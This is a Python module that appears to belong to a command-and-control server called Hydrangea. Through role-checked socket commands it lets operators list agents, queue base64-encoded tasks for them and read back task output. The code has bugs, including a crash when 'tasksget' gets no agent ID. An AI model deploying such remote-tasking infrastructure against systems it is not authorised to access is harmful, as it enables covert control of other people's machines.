from .socket_custom import SocketCustom
from database.database import HydrangeaDatabase
import base64

# Constants
AGENT_COMMANDS_PREFIX = (
    "agentsget",
    "tasknew",
    "tasksget"
)

# Handles Agent command; returns False if the input command is not a Task command
def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, clientId: str, user, userInput: str):
    # If command is for Task, handle here
    if userInput.startswith(AGENT_COMMANDS_PREFIX):
        # Split command
        userInputSplit = userInput.split(" ")

        # Get all agents
        if userInput.startswith("agentsget"): # agentsget
            if user.role not in ("operator", "admin"):
                socketClient.sendall(b"ERROR: Unauthorized")
            else:
                agents = db.getAllAgents()
                if agents:
                    agentsDataJson = "["
                    for agent in agents:
                        agentsDataJson += f"""
{{
    "agentId": "{agent.id}",
    "host": "{agent.host}",
    "username": "{agent.username}",
    "lastCheckinAt": {agent.lastCheckinAt}
}},"""
                    agentsDataJson = agentsDataJson.rstrip(",") + "\n]"
                    socketClient.sendall(f"SUCCESS: {len(agents)} agents:\n{agentsDataJson}".encode("utf-8"))
                else:
                    socketClient.sendall(f"ERROR: Failed to get all agents".encode("utf-8"))
        
        # Create new task
        if userInput.startswith("tasknew"): # tasknew AGENT_ID TASK_DATA_B64
            if user.role not in ("operator", "admin"):
                socketClient.sendall(b"ERROR: Unauthorized")
            elif len(userInputSplit) != 3:
                socketClient.sendall(b"ERROR: Invalid input")
            else:
                if db.createNewTask(
                    agentId=userInputSplit[1],
                    originClientId=clientId,
                    task=base64.b64decode(userInputSplit[2].encode("utf-8")).decode("utf-8")
                ):
                    socketClient.sendall(f"SUCCESS: Task created for agent '{userInputSplit[1]}'".encode("utf-8"))
                else:
                    socketClient.sendall(f"ERROR: Failed to create new task".encode("utf-8"))
        
        # Get agent's tasks
        if userInput.startswith("tasksget"): # tasksget [AGENT_ID]
            if user.role not in ("operator", "admin", "observer"):
                socketClient.sendall(b"ERROR: Unauthorized")
            else:
                tasks = None
                if len(userInputSplit) == 2:
                    tasks = db.getTasks(agentId=userInputSplit[1])
                else:
                    tasks = db.getTasks(agentId=None)
                tasksToSend = "["
                for task in tasks:
                    tasksToSend += f"""
{{
    "id": {task.id},
    "originClientId": "{task.originClientId}",
    "agentId": "{task.agentId}",
    "taskB64": "{base64.b64encode(task.task.encode("utf-8")).decode("utf-8")}",
    "outputB64": "{base64.b64encode((task.output if task.output is not None else "null").encode("utf-8")).decode("utf-8")}",
    "taskedAt": {task.taskedAt if task.taskedAt is not None else 0},
    "outputAt": {task.outputAt if task.outputAt is not None else 0}
}},"""
                tasksToSend = tasksToSend.rstrip(",") + "\n]"
                socketClient.sendall((f"SUCCESS: Tasks for agent '{userInputSplit[1]}':\n" + tasksToSend).encode("utf-8"))

        # Return true because command has been handled        
        return True
    else:
        # Return false if command is not for Agent
        return False